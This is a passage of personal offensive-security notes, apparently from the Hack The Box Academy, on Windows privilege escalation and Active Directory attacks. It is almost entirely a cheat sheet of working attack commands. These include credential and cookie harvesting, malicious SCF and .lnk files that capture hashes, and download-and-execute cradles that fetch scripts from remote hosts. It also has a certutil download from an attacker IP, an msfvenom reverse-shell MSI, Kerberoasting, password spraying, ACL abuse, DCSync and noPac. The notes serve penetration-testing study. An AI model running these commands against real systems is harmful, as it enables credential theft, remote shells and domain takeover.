        - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
        - C:\htb>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon”
    - Putty
        - Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
        - PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
        - PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
    - Wifi Passwords
        - C:\htb> netsh wlan show profile
    - Retrieving Saved Wireless Passwords
        - C:\htb> netsh wlan show profile ilfreight_corp key=clear
- https://github.com/SnaffCon/Snaffler
- Citrix Breakout
- Interacting with Users
    - Traffic Capture
    - tool net-creds can be run from our attack box to sniff passwords
    - Process Command Lines
        - Monitoring for Process Command Lines
        
        ```xml
        while($true)
        {
        
          $process = Get-WmiObject Win32_Process | Select-Object CommandLine
          Start-Sleep 1
          $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
          Compare-Object -ReferenceObject $process -DifferenceObject $process2
        
        }
        ```
        
        - Running Monitor Script on Target Host
            - IEX (iwr '[http://10.10.10.205/procmon.ps1](http://10.10.10.205/procmon.ps1)')
    - Vulnerable Services
    - SCF on a File Share
        - Shell Command File (SCF)
        - Malicious SCF File - name it @
- Malicious SCF File
    - name it something like @Inventory.scf
    
    ```xml
    [Shell]
    Command=2
    IconFile=\\\\10.10.14.3\\share\\legit.ico
    [Taskbar]
    Command=ToggleDesktop
    
    ```
    
    - Starting Responder
        - sudo responder -wrf -v -I tun0
    - Cracking NTLMv2 Hash with Hashcat
        - hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
    - Capturing Hashes with a Malicious .lnk File
        
        ```xml
        $objShell = New-Object -ComObject WScript.Shell
        $lnk = $objShell.CreateShortcut("C:\\legit.lnk")
        $lnk.TargetPath = "\\\\<attackerIP>\\@pwn.png"
        $lnk.WindowStyle = 1
        $lnk.IconLocation = "%windir%\\system32\\shell32.dll, 3"
        $lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
        $lnk.HotKey = "Ctrl+Alt+O"
        $lnk.Save()
        
        ```
        

### Pillaging

- Identifying Common Applications
    - dir "C:\Program Files”
- Get Installed Programs via PowerShell & Registry Keys
    
    ```xml
    PS C:\\htb> $INSTALLED = Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
    PS C:\\htb> $INSTALLED += Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, InstallLocation
    PS C:\\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
    
    ```
    
- mRemoteNG
    - confCons.xml
    - hardcoded password - mR3m
    - Discover mRemoteNG Configuration Files
        - ls C:\Users\julio\AppData\Roaming\mRemoteNG
    - python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==”
    - python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin
    - For Loop to Crack the Master Password with mremoteng_decrypt
        - for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done
- Abusing Cookies to Get Access to IM Clients
    - Copy Firefox Cookies Database
        - copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
    - Extract Slack Cookie from Firefox Cookies Database
        - python3 [cookieextractor.py](http://cookieextractor.py/) --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
    - Cookie Extraction from Chromium-based Browsers
        - IEX(New-Object Net.WebClient).DownloadString('[https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh)
        arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
        - Invoke-SharpChromium -Command "cookies [slack.com](http://slack.com/)
        - SharpChromium is looking for a file in %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies, but the actual file is located in %LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies
        - copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies”
- Clipboard
    - Monitor the Clipboard with PowerShell
        
        ```xml
        PS C:\\htb> IEX(New-Object Net.WebClient).DownloadString('<https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1>')
        PS C:\\htb> Invoke-ClipboardLogger
        
        ```
        
- Attacking Backup Servers
    - restic - Initialize Backup Directory
        - mkdir E:\restic2; restic.exe -r E:\restic2 init
    - restic - Back up a Directory
        - $env:RESTIC_PASSWORD = 'Password’
        - restic.exe -r E:\restic2\ backup C:\SampleFolder
    - restic - Back up a Directory with VSS
        - restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
    - restic - Check Backups Saved in a Repository
        - restic.exe -r E:\restic2\ snapshots
    - restic - Restore a Backup with ID
        - restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore

### Other techniqes

- Living Off The Land Binaries and Scripts (LOLBAS)
    - Transferring File with Certutil
        - certutil.exe -urlcache -split -f [http://10.10.14.3:8080/shell.bat](http://10.10.14.3:8080/shell.bat) shell.bat
    - Encoding File with Certutil
        - certutil -encode file1 encodedfile
    - Decoding File with Certutil
        - certutil -decode encodedfile file2
- Always Install Elevated
    - Always install with elevated privileges
    - following paths
        - Computer Configuration\Administrative Templates\Windows Components\Windows Installer
        - User Configuration\Administrative Templates\Windows Components\Windows Installer
    - Enumerating Always Install Elevated Settings
        - reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
        - reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
    - Generating MSI Package
        - msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
    - Executing MSI Package
        - msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
- CVE-2019-1388
- Scheduled Tasks
    - Enumerating Scheduled Tasks
        - schtasks /query /fo LIST /v
    - Enumerating Scheduled Tasks with PowerShell
        - Get-ScheduledTask | select TaskName,State
    - C:\Windows\System32\Tasks
- Checking Permissions on C:\Scripts Directory
    - C:\Scripts
    - .\accesschk64.exe /accepteula -s -d C:\Scripts\
- User/Computer Description Field
    - Checking Local User Description Field
        - Get-LocalUser
    - Enumerating Computer Description Field with Get-WmiObject Cmdlet
        - Get-WmiObject -Class Win32_OperatingSystem | select Description
- Mount VHDX/VMDK
    - Mount VMDK on Linux
        - guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
    - Mount VHD/VHDX on Linux
        - guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1
    - In Windows, we can right-click on the file and choose Mount, or use the Disk Management utility to mount a .vhd or .vhdx file. If preferred, we can use the Mount-VHD PowerShell cmdlet. Regardless of the method, once we do this, the virtual hard disk will appear as a lettered drive that we can then browse.
    - For a .vmdk file, we can right-click and choose Map Virtual Disk from the menu.
    - [https://www.nakivo.com/blog/extract-content-vmdk-files-step-step-guide/](https://www.nakivo.com/blog/extract-content-vmdk-files-step-step-guide/)
- Retrieving Hashes using [Secretsdump.py](http://secretsdump.py/)
    - [secretsdump.py](http://secretsdump.py/) -sam SAM -security SECURITY -system SYSTEM LOCAL
    - C:\Windows\System32\Config directory and pull down the SAM, SECURITY and SYSTEM registry
- For older systems
    - [https://github.com/rasta-mouse/Sherlock](https://github.com/rasta-mouse/Sherlock)
    - [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
    - Querying Current Patch Level
        - wmic qfe
    - Running Sherlock
        - Set-ExecutionPolicy bypass -Scope process
        - Import-Module .\Sherlock.ps1
        - Find-AllVulns
    - Obtaining a Meterpreter Shell
        - search smb_delivery
        - Rundll Command on Target Host
            - rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
        - search 2010-3338

## AD

- Tools
    - PowerView/SharpView
    - Bloodhound
    - Sharphound
    - [Bloodhound.py](http://bloodhound.py/)
    - kerbrute
    - responder
    - inveigh.ps1

### Initial Enumeration

- What
    - IP Space
    - Domain Information
    - Schema Format - email , ad username, password policy
    - Data Disclosures
    - Breach Data
- Where
    - ASN/IP Registrats - IANA arin, RIPE , BGP toolkit
    - Romai registrars and DNS - domaintools, ptrachive, icann
    - soical media
    - public facing company websires
    - cloud and dev storage spaces - github, aws s3, azure blob storage,
    - Breach data sources - HaveIBeenPwned or Dehashed
- Finding Address Spaces
    - BGP toolkit
    - DNS - domaintools, viewdns.inof
    - like Trufflehog and sites like Greyhat Warfare - for low hanging breadcrumbs
- Enumeration
    - filetype:pdf inurl:inlanefreight.com
    - intext:"@inlanefreight.com" inurl:inlanefreight.com
    - usernameharvesting -[https://github.com/initstring/linkedin2username](https://github.com/initstring/linkedin2username)
    - Credential Hunting - dehashed
- Key data points
    - AD users
    - AD joined computers
    - key services - Kerberos, NetBIOS, LDAP, DNS
    - vulnerable hosts and services
- Identifying Hosts
    - wireshark
    - tcpdump
    - ARP MDNS
    - sudo tcpdump -i ens224
    - net-creds, and NetMiner,
- Responder
    - listen, analyze, and poison LLMNR, NBT-NS, and MDNS requests and responses
    - Analyse mode
        - sudo responder -I ens224 -A
    - FPing Active Checks
        - fping -asgq 172.16.5.0/23
- Nmap Scanning
    - sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
- Identifying Users
    - using cme also
    - Kerbrute - Internal AD Username Enumeration
        - [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
        - kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

### Foothold

- LLMNR/NBT-NS Poisoning - from Linux
    - These hashes can be used to perform SMB relay
    - responder, inveigh, metasploit
    - /usr/share/responder/logs
    - Responder.conf - smb can be disabled
    - sudo responder -I ens224
    - [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
    - Cracking an NTLMv2 Hash With Hashcat
        - hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
- LLMNR/NBT-NS Poisoning - from Windows
    - Import-Module .\Inveigh.ps1
    - (Get-Command Invoke-Inveigh).Parameters
    - Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
    - C# Inveigh (InveighZero)
        - .\Inveigh.exe
        - type esc →
        - HELP
        - GET NTLMV2UNIQUE
        - GET NTLMV2USERNAMES

### Password Spraying

- Enumerating the Password Policy - from Linux - Credentialed
    - crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
- Enumerating the Password Policy - from Linux - SMB NULL Sessions
    - rpclient
    - enum4linux -P 172.16.5.5
    - enum4linux-ng -P 172.16.5.5 -oA ilfreight
- Enumerating Null Session - from Windows
    - net use \\host\ipc$ "" /u:"”
    - net use \\DC01\ipc$ "password" /u:guest
- Enumerating the Password Policy - from Linux - LDAP Anonymous Bind
    - ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
    - [windapsearch.py](http://windapsearch.py/), ldapsearch, [ad-ldapdomaindump.py](http://ad-ldapdomaindump.py/)
- Enumerating the Password Policy - from Windows
    - net accounts
    - Using PowerView
        - import-module .\PowerView.ps1
        - Get-DomainPolicy
- Password Spraying - Making a Target User List
    - enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]”
    - enumdomusers command after connecting anonymously using rpcclient
    - crackmapexec smb 172.16.5.5 --users
    - ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" “
    - ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
    - kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
- Credentialed Enumeration to Build our User List
    - sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
- Internal Password Spraying - from Linux
    - for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
    - for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
    - kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
    - sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
    - sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
- Local Administrator Password Reuse
    - sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
- Internal Password Spraying - from Windows
    - [https://github.com/dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
    - Import-Module .\DomainPasswordSpray.ps1
    - Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

### Enumerating

- Enumerating security controls
    - Checking the Status of Defender with Get-MpComputerStatus
        - Get-MpComputerStatus
    - AppLocker
        - Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
    - PowerShell Constrained Language Mode
        - $ExecutionContext.SessionState.LanguageMode
    - LAPS
        - Find-LAPSDelegatedGroups
        - Find-AdmPwdExtendedRights
        - Get-LAPSComputers
- Credentialed Enumeration - from Linux
    - Crackmapexec
        - -users
        - -groups
        - -loggedon-users
        - sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
        - sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
        - sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
        - sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
        - Dig through each readable share
            - sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares’
            - /tmp/cme_spider_plus/<ip of host>
    - SMBMap
        - smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
        - smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
    - rpcclient
        - rpcclient -U "" -N 172.16.5.5
        - queryuser 0x457
        - enumdomusers
    - Impacket Toolkit
        - [psexec.py](http://psexec.py/) inlanefreight.local/wley:'transporter@4'@172.16.5.125
        - [wmiexec.py](http://wmiexec.py/) inlanefreight.local/wley:'transporter@4'@172.16.5.5
        - Domain admins
            - python3 [windapsearch.py](http://windapsearch.py/) --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
            - PU :- Privileged users
            - python3 [windapsearch.py](http://windapsearch.py/) --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
        - [Bloodhound.py](http://bloodhound.py/)
            - sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
            - zip -r ilfreight_bh.zip *.json
            - upload zip
            - Find Shortest Paths To Domain Admins
- [https://wadcoms.github.io/](https://wadcoms.github.io/) IMP
- Credentialed Enumeration - from Windows
    - Get-Module
    - Import-Module ActiveDirectory
    - Get-Module
    - Get-ADDomain
    - Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
    - Get-ADTrust -Filter *
    - Get-ADGroup -Filter * | select name
    - Get-ADGroup -Identity "Backup Operators”
    - Get-ADGroupMember -Identity "Backup Operators”
    - PowerView
        - Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
        - Get-DomainGroupMember -Identity "Domain Admins" -Recurse
        - Get-DomainTrustMapping
        - Test-AdminAccess -ComputerName ACADEMY-EA-MS01
        - Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
    - SharpView
        - .\SharpView.exe Get-DomainUser -Help
        - .\SharpView.exe Get-DomainUser -Identity forend
    - Snaffler
        - Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
        - .\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data
    - Sharphound
        - .\SharpHound.exe -c All --zipfilename ILFREIGHT
        - c:\Windows\Temp\SharpHound.exe -c All --zipfilename ILFREIGHT --ldapusername AB920 --ldappassword weasal
- Living Off the Land
    - qwinsta
    - wmic qfe get Caption,Description,HotFixID,InstalledOn
    - [https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)
    - [https://academy.hackthebox.com/module/143/section/1360](https://academy.hackthebox.com/module/143/section/1360)

### Kerboroasting

- Any domain user can request a Kerberos ticket for any service account in the same domain.
- All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.
- Kerboroasting with [GetUserSPNs.py](http://getuserspns.py/)
    - Listing SPN Accounts with [GetUserSPNs.py](http://getuserspns.py/)
        - G[etUserSPNs.py](http://getuserspns.py/) -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
    - Requesting all TGS Tickets
        - [GetUserSPNs.py](http://getuserspns.py/) -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
    - Requesting a Single TGS ticket
        - [GetUserSPNs.py](http://getuserspns.py/) -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
    - [GetUserSPNs.py](http://getuserspns.py/) -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
    - hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
- From windows
    - Enumerating SPNs with setspn.exe
        - setspn.exe -Q */*
    - Targeting a Single User
        - Add-Type -AssemblyName System.IdentityModel
        - New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433”
    - Retrieving All Tickets Using setspn.exe
        - setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
    - Extracting Tickets from Memory with Mimikatz
        - base64 /out:true
        - kerberos::list /export
    - Preparing the Base64 Blob for Cracking
        - echo "<base64 blob>" | tr -d \\n
    - Placing the Output into a File as .kirbi
        - cat encoded_file | base64 -d > sqldev.kirbi
    - Extracting the Kerberos Ticket using [kirbi2john.py](http://kirbi2john.py/)
        - python2.7 [kirbi2john.py](http://kirbi2john.py/) sqldev.kirbi
    - Modifiying crack_file for Hashcat
        - sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
    - Cracking the Hash with Hashcat
        - hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
    - Or direct use list export without base64 it will generate .kirbi file
- Automates Kerboroasting windows
    - Using PowerView to Extract TGS Tickets
        - Import-Module .\PowerView.ps1
        - Get-DomainUser * -spn | select samaccountname
    - Using PowerView to Target a Specific User
        - Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
    - Exporting All Tickets to a CSV File
        - Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
    - Using Rubeus
        - .\Rubeus.exe kerberoast /stats
        - .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
        - .\Rubeus.exe kerberoast /user:testspn /nowrap
        - Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
        - hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
        - hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
        - `/tgtdeleg` flag to specify that we want only RC4 encryption

### Access Control List (ACL) Abuse

- ACE that can be abused
    - ForceChangePassword abused with Set-DomainUserPassword
    - Add Members abused with Add-DomainGroupMember
    - GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember
    - GenericWrite abused with Set-DomainObject
    - WriteOwner abused with Set-DomainObjectOwner
    - WriteDACL abused with Add-DomainObjectACL
    - AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember
    - Addself abused with Add-DomainGroupMe
- Attack Scenarios
    - Abusing forgot password permissions
    - Abusing group membership management
    - Excessive user rights
- Enumerating ACLs with PowerView
    - Using Find-InterestingDomainAcl
        - Find-InterestingDomainAcl
    - Import-Module .\PowerView.ps1
    - $sid = Convert-NameToSid wley
    - Using Get-DomainObjectACL
        - Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
        - ResolveGUIDs flag
    - Performing a Reverse Search & Mapping to a GUID Value
        - Performing a Reverse Search & Mapping to a GUID Value
        - Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
    - Using the -ResolveGUIDs Flag
        - Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
- Other (time consuming)
    - Creating a List of Domain Users
        - Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
    - A Useful foreach Loop
        - foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
- Further Enumeration of Rights Using damundsen
    - $sid2 = Convert-NameToSid damundsen
    - Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
- Investigating the Help Desk Level 1 Group with Get-DomainGroup
    - Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
- Investigating the Information Technology Group
    - $itgroupsid = Convert-NameToSid "Information Technology”
    - Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
- Looking for Interesting Access
    - $adunnsid = Convert-NameToSid adunn
    - Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
- DC-Sync attack
    - DS-Replication-Get-Changes
    - DS-Replication-Get-Changes-In-Filtered-Set
- Enumerating ACLs with BloodHound
    - wley → node info → outbound control rights
    - Transitive object control
- Abusing ACL
    - Creating a PSCredential Object
        - $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
        - $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
    - Creating a SecureString Object
        - $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
    - Changing the User's Password
        - cd C:\Tools\
        - Import-Module .\PowerView.ps1
        - Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
        - Linux - pth-net tool
    - Creating a SecureString Object using damundsen
        - $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
        - $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
    - Adding damundsen to the Help Desk Level 1 Group
        - Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
        - Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
    - Confirming damundsen was Added to the Group
        - Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
    - Creating a Fake SPN
        - Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
    - Kerberoasting with Rubeus
        - .\Rubeus.exe kerberoast /user:adunn /nowrap
    - Removing the Fake SPN from adunn's Account
        - Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
    - Removing damundsen from the Help Desk Level 1 Group
        - Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
    - Confirming damundsen was Removed from the Group
        - Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
- DCSync
    - [secretsdump.py](http://secretsdump.py/) → secretsdump.exe
    - Directory Replication Service Remote Protocol
    - Using Get-DomainUser to View adunn's Group Membership
        - Get-DomainUser -Identity adunn |select samaccountname,objectsid,memberof,useraccountcontrol |fl
    - Using Get-ObjectAcl to Check adunn's Replication Rights
        - $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164”
        - Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($*.ObjectAceType -match 'Replication-Get')} | ?{$*.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
    - `WriteDacl`
    - Extracting NTLM Hashes and Kerberos Keys Using [secretsdump.py](http://secretsdump.py/)
        - [secretsdump.py](http://secretsdump.py/) -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
        - just-dc-ntlm
        - pwd-last-set
        - history
        - user-status
    - Listing Hashes, Kerberos Keys, and Cleartext Passwords
        - ls inlanefreight_hashes*
    - Enumerating Further using Get-ADUser
        - Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
    - Checking for Reversible Encryption Option using Get-DomainUser
        - Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*’} |select samaccountname,useraccountcontrol
    - Displaying the Decrypted Password
        - cat inlanefreight_hashes.ntds.cleartext
- DCSync using mimikatz
    - runas /netonly /user:INLANEFREIGHT\adunn powershell
    - .\mimikatz.exe
    - privilege::debug
    - lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator

### Privileged Access

- Edges Bloodhound
    - CanRDP
    - CanPSRemote
    - SQLAdmin
- Remote Desktop
    - Enumerating the Remote Desktop Users Group
        - Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users”
    - Checking the Domain Users Group's Local Admin & Execution Rights using BloodHound
    - Checking Remote Access Rights using BloodHound
        - Find Workstations where Domain Users can RDP
        - Find Servers where Domain Users can RDP
- WinRM
    - Enumerating the Remote Management Users Group
        - Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users”
    - Cypher query
        - `MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2`
    - Establishing WinRM Session from Windows
        - $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Forc
        - $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
        - Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
    - Connecting to a Target with Evil-WinRM and Valid Credentials
        - evil-winrm -i 10.129.201.234 -u forend
- SQL Server Admin
    - `MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2`
    - [https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
    - Enumerating MSSQL Instances with PowerUpSQL
        - cd .\PowerUpSQL\
        - Import-Module .\PowerUpSQL.ps1
        - Get-SQLInstanceDomain
        - Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version’
    - Running [mssqlclient.py](http://mssqlclient.py/) Against the Target
        - [mssqlclient.py](http://mssqlclient.py/) INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
        - enable_xp_cmdshell
        - xp_cmdshell <command>
- Kerberos Double Hop Problem
- NoPac
    - [https://github.com/Ridter/noPac.git](https://github.com/Ridter/noPac.git)
    - sudo python3 [scanner.py](http://scanner.py/) inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
    - sudo python3 [noPac.py](http://nopac.py/) INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
    - Confirming the Location of Saved Tickets
    - Using noPac to DCSync the Built-in Administrator Account
